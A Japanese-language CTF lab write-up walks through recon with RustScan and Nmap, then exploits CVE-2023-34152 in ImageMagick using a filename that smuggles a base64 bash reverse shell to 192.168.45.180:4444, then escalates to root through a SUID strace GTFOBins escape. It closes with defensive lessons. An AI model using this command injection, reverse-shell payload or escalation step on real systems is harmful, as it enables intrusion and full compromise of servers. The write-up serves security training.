## 概要

| Field                     | Value                                                        |
|---------------------------|--------------------------------------------------------------|
| OS | Linux (Ubuntu)                                               |
| 難易度 | Easy                                                         |
| 攻撃対象 | Web (HTTP/80)                                                |
| 主な侵入経路 | CVE-2023-34152 — ImageMagick 6.9.6-4 ファイル名経由のシェルコマンドインジェクション |
| 権限昇格経路 | SUID `/usr/bin/strace` → 特権シェル (GTFOBins)         |

## 認証情報

認証情報なし。

## 偵察

### ポートスキャン (Rustscan)

まず RustScan を使って全 TCP ポートスキャンを行い、開放ポートを素早く列挙します。RustScan の高速性により、1～65535 の全ポートを数秒でスキャンし、発見されたポートを Nmap に渡してより詳細な調査を行います。ここでの目的は、列挙の優先順位を決める前に攻撃対象を素早くマッピングすることです。

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[1:36][CPU:13][MEM:62][TUN0:192.168.45.180][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.104.178:22
Open 192.168.104.178:80
```

開放ポートは **22 (SSH)** と **80 (HTTP)** の 2 つです。

### サービス列挙 (Nmap)

開放ポートを特定したら、サービスバージョン検出 (`-sV`)、デフォルトスクリプト (`-sC`)、OS 検出 (`-A`)、積極的なタイミング設定 (`-T4`) を組み合わせた完全な Nmap スキャンを実行します。`-Pn` でホストが稼働中として扱い、後で参照できるよう出力を XML 形式で保存します。HTTP タイトルからポート 80 で動作しているアプリケーションを確認します。

```bash
timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
echo -e "\e[32mScan result saved to: $output_file\e[0m"
```

```bash
✅[1:36][CPU:6][MEM:61][TUN0:192.168.45.180][/home/n0z0]
🐉 > timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"

grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"

echo -e "\e[32mScan result saved to: $output_file\e[0m"
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 01:36 JST
Nmap scan report for 192.168.104.178
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: ImageMagick Identifier
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   187.79 ms 192.168.45.1
2   187.74 ms 192.168.45.254
3   187.83 ms 192.168.251.1
4   187.93 ms 192.168.104.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 558.76 seconds
Scan result saved to: /home/n0z0/work/scans/20260205-013634_192.168.104.178.xml
```

主な発見:
- **ポート 22**: OpenSSH 8.2p1 (Ubuntu)
- **ポート 80**: Apache 2.4.41 — HTTP タイトルは **"ImageMagick Identifier"** であり、画像処理 Web アプリケーションが稼働していることが判明

### Web 列挙

ポート 80 にアクセスすると、画像をアップロードして ImageMagick で処理する Web インターフェースが表示されます。アプリケーションは ImageMagick のバージョンを直接公開しており、**6.9.6-4** であることが確認できます。このバージョンは CVE-2023-34152 の影響を受けることが知られています。


*キャプション: Web アプリケーションが ImageMagick バージョン 6.9.6-4 を公開しており、脆弱なコンポーネントが直接開示されています。*

## 初期足がかり

### CVE-2023-34152 — ImageMagick Shell Command Injection

**CVE-2023-34152** は、バージョン 7.1.0-48 未満（6.x ブランチでは 6.9.12-48 未満）の ImageMagick に存在するシェルコマンドインジェクションの脆弱性です。脆弱性は `magick/blob.c` 内の `OpenBlob()` 関数に存在します。ImageMagick がパイプ文字 (`|`) で始まるファイル名を処理する際、`popen()` を介してそのファイル名を直接シェルに渡してしまいます。シェルコマンドを含む悪意のあるファイル名（バッククォート展開など）を細工することで、攻撃者はファイルを処理するサーバー上で任意のコードを実行できます。

公開 PoC (SudoIndividual/CVE-2023-34152) は、base64 エンコードされたリバースシェルペイロードをバッククォートインジェクションとしてファイル名に埋め込んだ画像ファイルを生成することで、攻撃を自動化します。

#### リスナーのセットアップ

エクスプロイトを実行する前に、より快適なシェル操作のために `rlwrap` でラップした netcat リスナーを起動します。`rlwrap` は生の netcat セッションに readline サポート（コマンド履歴、矢印キー）を提供します。ペイロードのコールバック先となるポート 4444 でリッスンします。

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[2:10][CPU:16][MEM:71][TUN0:192.168.45.180][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
```

#### 悪意のあるペイロードの生成

PoC スクリプトを GitHub からローカルの作業ディレクトリにクローンして実行します。スクリプトは、バッククォートインジェクションされたシェルコマンドを含むファイル名の画像ファイルを生成します。ペイロードはシェルのメタ文字の問題を回避するために base64 エンコードされています。ディレクトリ一覧で生成されたファイルを確認します — エンコードされたリバースシェルを含む悪意のあるファイル名が確認できます。

```bash
ls -la
```

```bash
✅[2:11][CPU:14][MEM:70][TUN0:192.168.45.180][...ound/Image/CVE-2023-34152]
🐉 > ls -la
合計 24
drwxrwxr-x 3 n0z0 n0z0 4096  2月  5 02:11  .
drwxrwxr-x 3 n0z0 n0z0 4096  2月  5 02:01  ..
drwxrwxr-x 7 n0z0 n0z0 4096  2月  5 02:01  .git
-rw-rw-r-- 1 n0z0 n0z0 1382  2月  5 02:01  CVE-2023-34152.py
-rw-rw-r-- 1 n0z0 n0z0 1192  2月  5 02:01  README.md
-rw-rw-r-- 1 n0z0 n0z0  351  2月  5 02:11 '|smile"`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xODAvNDQ0NCAwPiYxIg==|base64 -d|bash`".png'
```

生成されたファイル名にはペイロードが埋め込まれています:
- 先頭の `|` が ImageMagick の `popen()` パスをトリガー
- バッククォートインジェクションにより実行: `echo <base64> | base64 -d | bash`
- base64 文字列のデコード結果: `/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.180/4444 0>&1"`

このファイルを Web アプリケーションにアップロードすると、ImageMagick がファイル名を処理してインジェクションされたコマンドを実行します。

💡 **なぜ有効か**: ImageMagick の `OpenBlob()` 関数はファイル名が `|` で始まるかどうかを確認し、そうであれば残りの文字列を `popen()` 経由で実行するシェルコマンドとして扱います。これはパイプベースの入力向けの正当な機能ですが、ユーザーが指定したファイル名がサニタイズなしで `OpenBlob()` に直接渡される場合に悪用可能となります。ファイル名内のバッククォート展開は `popen()` が起動したシェルによって評価され、攻撃者のリバースシェルペイロードが実行されます。

#### リバースシェルの受信

Web インターフェース経由で悪意のあるファイルをアップロードすると、ImageMagick がファイル名を処理してペイロードがトリガーされます。netcat リスナーがサーバーからの接続を受け取ります:

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[2:10][CPU:16][MEM:71][TUN0:192.168.45.180][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.104.178] 48010
bash: cannot set terminal process group (1131): Inappropriate ioctl for device
bash: no job control in this shell
www-data@image:/var/www/html$
```

`www-data` としてのシェルを取得しました。

## 権限昇格

### SUID `strace` — GTFOBins シェルエスケープ

ターゲットに着地後、権限昇格パスを見つけるために SUID バイナリを列挙します。LinPEAS の SUID チェックまたは手動の `find` を実行すると、重大な設定ミスが発見されます: `/usr/bin/strace` に SUID ビットが設定されており、root が所有者です。これは GTFOBins の権限昇格ベクターとして記録されています。

LinPEAS の出力でこの発見が強調されています:

```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-sr-x 1 root root 1.6M Apr 16  2020 /usr/bin/strace
```

`strace` はシステムコールトレーサーです。SUID ビットが設定されていると、`strace` を呼び出すとすべて root の実効 UID で実行されます。[GTFOBins — strace](https://gtfobins.github.io/gtfobins/strace/#shell) によると、`strace` を使って単純なコマンドをトレースすることで任意のシェルを起動できます。`-o /dev/null` フラグでトレース出力を破棄し（ターミナルが乱れるのを防ぐ）、`/bin/sh -p` で昇格した実効 UID を保持するシェルを起動します。

💡 **なぜ有効か**: SUID ビットにより、カーネルは exec 時にプロセスの実効 UID をバイナリ所有者の UID（root）に設定します。`strace` はその後 `execve()` を呼び出してトレース対象プロセス（この場合は `/bin/sh -p`）を起動します。`-p` フラグは `sh` に対して実 UID にリセットせず昇格した `euid` を保持するよう指示します。結果として、`www-data` の実 UID で動作しながら root の実効 UID を持つ root シェルが得られ、ファイルシステム全体へのアクセスが可能になります。

```bash
/usr/bin/strace -o /dev/null /bin/sh -p
```

```bash
www-data@image:/tmp$ /usr/bin/strace -o /dev/null /bin/sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

`euid=0(root)` により、root 権限で操作していることが確認できます。

#### root フラグ

root 権限を取得し、`/root/` から proof ファイルを読み取ります:

```bash
cat /root/proof.txt
```

```bash
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cat /root/proof.txt
0b53b763d486a2475600aa0d96cd62d2
#
```

## 攻撃チェーン概要

```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1: Reconnaissance"]
        direction TB
        K1A[RustScan executed]
        K1B[2 ports discovered]
        K1C["22/SSH<br/>80/HTTP"]
        K1D[Nmap detailed scan]

        K1A --> K1B --> K1C --> K1D
    end

    subgraph KC2["Kill Chain 2: Service Enumeration"]
        direction TB
        K2A[OpenSSH 8.2p1 Ubuntu]
        K2B[Apache 2.4.41 Ubuntu]
        K2C[ImageMagick Identifier]
        K2D["Version: 6.9.6-4"]

        K2A --> K2B --> K2C --> K2D
    end

    subgraph KC3["Kill Chain 3: Vulnerability Research"]
        direction TB
        K3A[ImageMagick 6.9.6-4 investigated]
        K3B[CVE-2023-34152 found]
        K3C[Shell Command Injection confirmed]
        K3D["PoC script obtained<br/>SudoIndividual"]

        K3A --> K3B --> K3C --> K3D
    end

    subgraph KC4["Kill Chain 4: Initial Access Preparation"]
        direction TB
        K4A["nc listener started<br/>192.168.45.180:4444"]
        K4B[CVE-2023-34152.py executed]
        K4C["Malicious PNG generated<br/>Base64-encoded shell"]
        K4D["Payload embedded in filename<br/>backtick injection"]

        K4A --> K4B --> K4C --> K4D
    end

    subgraph KC5["Kill Chain 5: Exploit"]
        direction TB
        K5A[PNG file uploaded]
        K5B[ImageMagick processing starts]
        K5C[OpenBlob function triggered]
        K5D[Command injection succeeds]

        K5A --> K5B --> K5C --> K5D
    end

    subgraph KC6["Kill Chain 6: Reverse Shell Established"]
        direction TB
        K6A["Connection established<br/>192.168.104.178:48010"]
        K6B[www-data shell obtained]
        K6C["uid=33 www-data confirmed"]
        K6D[Stabilization]

        K6A --> K6B --> K6C --> K6D
    end

    subgraph KC7["Kill Chain 7: Privilege Escalation"]
        direction TB
        K7A[SUID enumeration performed]
        K7B["/usr/bin/strace found<br/>rwsr-sr-x root"]
        K7C["GTFOBins consulted<br/>strace abuse method"]
        K7D["strace -o /dev/null<br/>/bin/sh -p executed"]

        K7A --> K7B --> K7C --> K7D
    end

    subgraph KC8["Kill Chain 8: Objective Achieved"]
        direction TB
        K8A[Root shell obtained]
        K8B["euid=0 egid=0 confirmed"]
        K8C["/root/proof.txt found"]
        K8D[0b53b763d486a2475600aa0d96cd62d2]

        K8A --> K8B --> K8C --> K8D
    end

    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8

    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b3e5fc
    style KC7 fill:#ff9800
    style KC8 fill:#4caf50
    style K6B fill:#ff6b6b,color:#fff
    style K8B fill:#ff6b6b,color:#fff
    style K8D fill:#2196f3,color:#fff
```



## まとめ・学んだこと

1. **バージョン開示は重大な情報漏洩**: Web アプリケーションがページタイトルに ImageMagick のバージョン番号を直接表示していました。この一つの情報だけで即座に CVE 検索と標的を絞った攻撃が可能になりました。本番環境ではバージョン情報のバナーを抑制してください。

2. **ユーザーが制御するファイル名を画像処理ライブラリに直接渡さない**: ImageMagick の `popen()` パイプ機能は正当な内部メカニズムですが、ファイル名がユーザーのアップロードに由来する場合は兵器化されたプリミティブになります。処理前にシェルメタ文字（`|`、`` ` ``、`$` など）を含むファイル名を常にサニタイズまたは拒否してください。

3. **強力なユーティリティの SUID ビットは高価値のターゲット**: `strace` は本番システムに SUID ビットを設定すべきでない特権デバッグツールです。無害に見えるユーティリティでも権限昇格のために簡単に悪用される可能性があります — インストールされた SUID バイナリを常に GTFOBins と照合してください。

4. **エクスプロイトチェーンは完全にツールチェーン主導**: 公開 PoC から GTFOBins のワンライナーまで、このマシンではカスタムエクスプロイト開発は不要でした。ソフトウェアにパッチを当て続け、エクスプロイト後の環境を強化（不要なバイナリから SUID を削除）することで、いずれかのステップでチェーンを断ち切ることができました。

## 参考文献

- [RustScan — Modern Port Scanner](https://github.com/RustScan/RustScan)
- [CVE-2023-34152 — NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2023-34152)
- [CVE-2023-34152 PoC — SudoIndividual (GitHub)](https://github.com/SudoIndividual/CVE-2023-34152)
- [GTFOBins — strace](https://gtfobins.github.io/gtfobins/strace/)
- [HackTricks — SUID Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid)
- [rlwrap — readline wrapper for netcat](https://github.com/hanslub42/rlwrap)
